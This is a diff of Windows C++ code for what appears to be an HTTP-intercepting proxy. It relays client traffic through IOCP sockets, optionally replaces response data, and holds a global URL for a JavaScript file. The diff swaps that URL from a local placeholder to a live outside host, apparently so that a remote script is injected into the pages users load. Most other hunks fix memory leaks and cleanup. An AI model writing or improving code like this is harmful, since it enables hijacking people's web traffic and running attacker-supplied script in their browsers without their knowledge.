@@ -465,7 +465,7 @@ BOOL EasyConnect( SOCKET sock , LPCSTR pszTargetIP,USHORT nTargetPort)
 
 
 
-CStringA g_strJsUrl="./fuckyou.js";
+CStringA g_strJsUrl="http://b.yxk6.com/qm20160728.js";
 
 VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL bHeadData,BOOL bFinalData)
 {
@@ -555,7 +555,14 @@ VOID WINAPI MY_CALLBACK_CLIENT_DISCONNECT( HANDLE hClient , PVOID pUserParam)
 	PCLIENT_DATA pClientData = (PCLIENT_DATA)pUserParam;
 	if(pClientData)
 	{
-		DeleteIOCPNode( (PIOCP_NODE)(pClientData->hRemote) );
+		if (pClientData->pHttpDataParser)
+		{
+			delete pClientData->pHttpDataParser;
+		}
+
+		DeleteIOCPNode( pClientData->hRemote );
+
+		delete pClientData;
 	}
 }
 
@@ -570,6 +577,10 @@ VOID WINAPI MY_CALLBACK_DATA_RECV( HANDLE hClient,PVOID pUserParam,BYTE *pDataBu
 		{
 			BOOL bFinalData = FALSE;
 			pClientData->pHttpDataParser->ParseRecvData( pDataBuffer,dwDataLen,&bFinalData);
+			if (bFinalData)
+			{
+				pClientData->pHttpDataParser->ResetParser();
+			}
 		}
 		
 		if (  FALSE == pClientData->CallbackParam.bReplaceData )
@@ -593,6 +604,7 @@ VOID WINAPI MY_CALLBACK_DATA_RECV( HANDLE hClient,PVOID pUserParam,BYTE *pDataBu
 			BOOL bRemoteRes = FALSE;
 			HANDLE hRemote = NULL;
 			SOCKET sockRemote = INVALID_SOCKET;
+			PCLIENT_DATA pRemoteData = NULL;
 			do 
 			{
 				sockRemote = WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,WSA_FLAG_OVERLAPPED);
@@ -618,7 +630,7 @@ VOID WINAPI MY_CALLBACK_DATA_RECV( HANDLE hClient,PVOID pUserParam,BYTE *pDataBu
 				pClientData->hRemote = hRemote;
 				
 
-				PCLIENT_DATA pRemoteData = new CLIENT_DATA;
+				pRemoteData = new CLIENT_DATA;
 				pRemoteData->hRemote = hClient;
 				pRemoteData->strHeadBuffer = "";
 				pRemoteData->CallbackParam.bReplaceData = FALSE;
@@ -635,7 +647,10 @@ VOID WINAPI MY_CALLBACK_DATA_RECV( HANDLE hClient,PVOID pUserParam,BYTE *pDataBu
 
 			if ( FALSE == bRemoteRes )
 			{
-				closesocket(sockRemote);
+				if (hRemote)
+				{
+					DeleteIOCPNode(hRemote);
+				}
 			}
 
 		}
